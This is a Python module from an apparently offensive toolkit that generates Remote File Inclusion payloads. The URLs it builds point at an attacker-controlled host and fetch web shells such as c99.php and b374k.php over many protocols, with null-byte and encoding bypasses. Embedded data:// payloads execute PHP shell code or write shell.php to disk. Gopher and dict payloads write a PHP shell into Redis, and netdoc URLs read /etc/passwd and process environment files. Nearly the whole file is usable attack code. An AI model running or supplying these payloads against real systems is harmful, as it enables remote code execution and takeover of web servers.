"""
Remote File Inclusion (RFI) payload generator.

Generates payloads using multiple protocols:
HTTP, HTTPS, FTP, Gopher, Dict, TFTP, LDAP, jar, netdoc, data://
"""

import base64
import urllib.parse

from core.encoders import url_encode, double_url_encode, null_byte_suffix
from config.default_targets import RFI_SHELL_FILES, RFI_PROTOCOLS


def generate_protocol_payloads(attacker_host: str) -> dict:
    """Generate RFI payloads across all supported protocols."""
    results = {}

    for protocol in RFI_PROTOCOLS:
        category = f"RFI — {protocol.rstrip(':/').upper()}"
        payloads = []

        for shell_file in RFI_SHELL_FILES:
            base_payload = f"{protocol}{attacker_host}/{shell_file}"

            # Standard
            payloads.append(base_payload)

            # Port variations
            for port in [80, 443, 8080, 8443, 4444, 9090, 1337]:
                payloads.append(
                    f"{protocol}{attacker_host}:{port}/{shell_file}"
                )

            # Null byte bypass
            payloads.append(null_byte_suffix(base_payload))

            # URL encoded
            payloads.append(url_encode(base_payload))

            # Double encoded
            payloads.append(double_url_encode(base_payload))

            # Query string bypass
            payloads.append(f"{base_payload}?")
            payloads.append(f"{base_payload}%3f")

            # Trailing hash bypass
            payloads.append(f"{base_payload}#")

            # With null byte + extension
            payloads.append(f"{base_payload}%00.php")
            payloads.append(f"{base_payload}%00.html")

        results[category] = list(dict.fromkeys(payloads))

    return results


def generate_data_rfi_payloads() -> dict:
    """Generate data:// based RFI payloads."""
    commands = [
        "<?php system($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php echo shell_exec($_GET['cmd']); ?>",
        "<?php phpinfo(); ?>",
        "<?php file_put_contents('shell.php', '<?php system($_GET[\"cmd\"]); ?>'); ?>",
        "<?php eval($_POST['cmd']); ?>",
        "<?php include($_GET['x']); ?>",
    ]

    payloads = []
    for cmd in commands:
        payloads.append(
            f"data://text/plain,{urllib.parse.quote(cmd, safe='')}"
        )
        encoded = base64.b64encode(cmd.encode()).decode()
        payloads.append(f"data://text/plain;base64,{encoded}")

    return {"RFI — data:// Injection": payloads}


def generate_gopher_payloads(attacker_host: str) -> dict:
    """Generate gopher:// protocol payloads for SSRF chaining."""
    payloads = [
        f"gopher://{attacker_host}:80/_GET%20/shell.php%20HTTP/1.1%0d%0aHost:%20{attacker_host}%0d%0a%0d%0a",
        f"gopher://{attacker_host}:80/_POST%20/shell.php%20HTTP/1.1%0d%0a",
        f"gopher://{attacker_host}:6379/_INFO%0d%0a",
        f"gopher://{attacker_host}:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0d%0a",
        f"gopher://127.0.0.1:25/_MAIL%20FROM:%3Cattacker@{attacker_host}%3E",
    ]
    return {"RFI — GOPHER": list(dict.fromkeys(payloads))}


def generate_dict_payloads(attacker_host: str) -> dict:
    """Generate dict:// protocol payloads."""
    payloads = [
        f"dict://{attacker_host}:6379/INFO",
        f"dict://{attacker_host}:6379/CONFIG%20SET%20dir%20/var/www/html",
        f"dict://{attacker_host}:6379/CONFIG%20SET%20dbfilename%20shell.php",
        f"dict://{attacker_host}:11211/stats",
        f"dict://127.0.0.1:6379/INFO",
        f"dict://127.0.0.1:11211/stats",
    ]
    return {"RFI — DICT": list(dict.fromkeys(payloads))}


def generate_tftp_payloads(attacker_host: str) -> dict:
    """Generate tftp:// protocol payloads."""
    payloads = []
    for shell in RFI_SHELL_FILES:
        payloads.append(f"tftp://{attacker_host}/{shell}")
        payloads.append(f"tftp://{attacker_host}:69/{shell}")
    return {"RFI — TFTP": list(dict.fromkeys(payloads))}


def generate_ldap_payloads(attacker_host: str) -> dict:
    """Generate ldap:// / ldaps:// protocol payloads."""
    payloads = [
        f"ldap://{attacker_host}/o=payload",
        f"ldap://{attacker_host}:389/o=payload",
        f"ldap://{attacker_host}:389/dc=payload,dc=com",
        f"ldaps://{attacker_host}/o=payload",
        f"ldaps://{attacker_host}:636/o=payload",
        f"ldap://{attacker_host}/%0astats%0aquit",
    ]
    return {"RFI — LDAP / LDAPS": list(dict.fromkeys(payloads))}


def generate_jar_payloads(attacker_host: str) -> dict:
    """Generate jar:// and netdoc:// protocol payloads (Java targets)."""
    payloads = [
        f"jar:http://{attacker_host}/shell.jar!/shell.php",
        f"jar:http://{attacker_host}:8080/shell.jar!/payload.class",
        f"jar:https://{attacker_host}/shell.jar!/shell.jsp",
        f"netdoc:///{attacker_host}/shell.php",
        f"netdoc:///etc/passwd",
        f"netdoc:///proc/self/environ",
    ]
    return {"RFI — JAR / NETDOC": list(dict.fromkeys(payloads))}


def generate_custom_rfi_payloads(attacker_host: str) -> dict:
    """Generate advanced RFI payloads with obfuscation."""
    payloads = [
        # SMB share (Windows)
        f"\\\\{attacker_host}\\share\\shell.php",
        f"//{attacker_host}/share/shell.php",

        # IP obfuscation
        f"http://0x{_ip_to_hex(attacker_host)}/shell.php"
        if _is_ipv4(attacker_host)
        else f"http://{attacker_host}/shell.php",

        # HTTP basic auth bypass
        f"http://legitimate-site@{attacker_host}/shell.php",
        f"http://admin:admin@{attacker_host}/shell.php",

        # Protocol-relative
        f"//{attacker_host}/shell.php",
        f"//{attacker_host}:8080/shell.php",

        # Various shell names
        f"http://{attacker_host}/reverse.php",
        f"http://{attacker_host}/payload.txt",
        f"http://{attacker_host}/include.inc",
        f"http://{attacker_host}/config.bak",
        f"http://{attacker_host}/c99.php",
        f"http://{attacker_host}/r57.php",
        f"http://{attacker_host}/b374k.php",

        # Shortname bypass
        f"http://{attacker_host}/SHELL~1.PHP",
    ]

    return {"RFI — Advanced / Custom": list(dict.fromkeys(payloads))}


def generate_all_rfi_payloads(attacker_host: str) -> dict:
    """Generate all RFI payloads grouped by category."""
    all_payloads = {}
    all_payloads.update(generate_protocol_payloads(attacker_host))
    all_payloads.update(generate_data_rfi_payloads())
    all_payloads.update(generate_gopher_payloads(attacker_host))
    all_payloads.update(generate_dict_payloads(attacker_host))
    all_payloads.update(generate_tftp_payloads(attacker_host))
    all_payloads.update(generate_ldap_payloads(attacker_host))
    all_payloads.update(generate_jar_payloads(attacker_host))
    all_payloads.update(generate_custom_rfi_payloads(attacker_host))
    return all_payloads


def _is_ipv4(host: str) -> bool:
    """Check if the host string is a valid IPv4 address."""
    parts = host.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False


def _ip_to_hex(ip: str) -> str:
    """Convert an IPv4 address to hex representation."""
    if not _is_ipv4(ip):
        return ip
    parts = ip.split(".")
    return "".join(f"{int(p):02x}" for p in parts)
